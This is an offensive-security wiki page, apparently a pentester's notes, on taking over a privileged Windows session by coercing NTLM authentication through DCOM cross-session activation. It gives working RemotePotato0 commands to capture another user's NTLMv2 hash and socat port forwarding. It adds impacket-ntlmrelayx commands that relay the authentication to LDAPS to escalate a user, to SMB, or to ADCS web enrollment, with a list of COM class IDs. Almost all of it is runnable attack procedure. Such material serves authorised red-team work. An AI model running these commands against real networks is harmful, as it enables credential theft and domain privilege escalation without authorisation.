---
title: NTLM Relay from DCOM
---

If you have unprivileged access to a computer where a privileged user is logged in, you can take over that user by [[notes/ad/ntlm-relay-source|coercing NTLM authentication]] trough [[notes/network/dcom]] cross-session activation.
This is often exploitable on terminal servers.

# Attack 1: Capture

Capture the NTLMv2 response of another session.

On outdated systems, primarily Windows Server 2008, no additional requirements must be satisfied.

=== "[[notes/tools/remotepotato0]]"
    ~~~
    PS C:\Users\jane> query session
    SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
    services                                    0  Disc
                    johnadm                     3  Disc
    >console           jane                     4  Active
    rdp-tcp                                 65536  Listen
    PS C:\Users\jane>.\RemotePotato0.exe -m 2 -s 3 -c '{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}'
    ...
    NTLMv2 Hash     : johnadm::CORP:8d9d...
    ~~~

The attack still works on modern systems, but you need control over a second system which accepts TCP connections on port 135 and forwards them back to an arbitrary port on the first system (port 9999 in the example).

=== "[[notes/tools/remotepotato0]]"
    ~~~ bash
    # 172.30.253.1 aka the second system
    socat -dd tcp-listen:135,fork,reuseaddr tcp:172.30.253.2:9999
    ~~~

    ~~~ powershell
    # 172.30.253.2 aka the first system
    .\RemotePotato0.exe -m 2 -s 3 -c '{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}' -x 172.30.253.1 -p 9999
    ~~~

References:

- [BlueHat IL 2022 - Antonio Cocomazzi & Andrea Pierini - Relaying to greatness](https://www.youtube.com/watch?v=vfb-bH_HaW4)

# Attack 2: Relay

Abuse DCOM to coerce NTLM authentication from a privileged session on the current system (pink) over MSRPC to a second system (green) which forwards the raw TCP connection back to the first system from where it is relayed over HTTP back to the second system and on to the final target.

![Relaying with [[notes/tools/remotepotato0]]](./ntlm-relay-remotepotato0.png)

List sessions on the current system (`172.30.253.2`).

~~~
PS C:\Users\jane> query session
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
                   johnadm                   3  Disc
>console           jane                      4  Active
 rdp-tcp                                 65536  Listen
~~~

Forward MSRPC connections from the second system (`172.30.253.1:135`) back to the first (`172.30.253.2:9999`).

~~~ bash
socat -dd tcp-listen:135,fork,reuseaddr tcp:172.30.253.2:9999
~~~

Relay HTTP from the second system (`172.30.253.1:80`) to the final target.
The connection to the final target can be over [[notes/ad/ntlm-relay-to-smb|SMB]] or [[notes/ad/ntlm-relay-to-http|HTTP]].
If you are coercing authentication on a system without the October 2022 patch the target can be [[notes/ad/ntlm-relay-to-ldap|LDAP]] as well ([source](https://twitter.com/_Imm0/status/1595131175260942336), [source](https://twitter.com/decoder_it/status/1744432137397211624)).

=== "LDAP"
    ~~~ bash
    impacket-ntlmrelayx -debug --no-smb-server --no-raw-server --no-wcf-server -smb2support --http-port 80 -t ldaps://dc01.corp.local --escalate-user jane
    ~~~

=== "SMB"
    ~~~ bash
    impacket-ntlmrelayx -debug --no-smb-server --no-raw-server --no-wcf-server -smb2support --http-port 80 -t smb://srv01.corp.local
    ~~~

=== "ADCS Web Enrollment"
    ~~~ bash
    impacket-ntlmrelayx -debug --no-smb-server --no-raw-server --no-wcf-server -smb2support --http-port 80 -t http://ca01.corp.local --adcs --template User
    ~~~

Coerce NTLM authentication from the current system to `172.30.253.1:135` on the second system.
Then relay the MSRPC connection coming in from the second system on `172.30.253.2:9999` back over HTTP to `172.30.253.1:80` were `impacket-ntlmrelayx` is running.

=== "[[notes/tools/remotepotato0]]"
    ~~~ bat
    .\RemotePotato0.exe -m 0 -s 3 -c '{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}' -x 172.30.253.1 -p 9999 -r 172.30.253.1 -t 80
    ~~~

Other tools:

- [SharpDcomTrigger](https://github.com/cube0x0/SharpSystemTriggers/tree/main/SharpDcomTrigger), seems patched

References:

- [BlueHat IL 2022 - Antonio Cocomazzi & Andrea Pierini - Relaying to greatness](https://www.youtube.com/watch?v=vfb-bH_HaW4)

# COM Class IDs

Depending on the Windows version you have to try different class IDs.

~~~
{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
{854A20FB-2D44-457D-992F-EF13785D2B51}
~~~
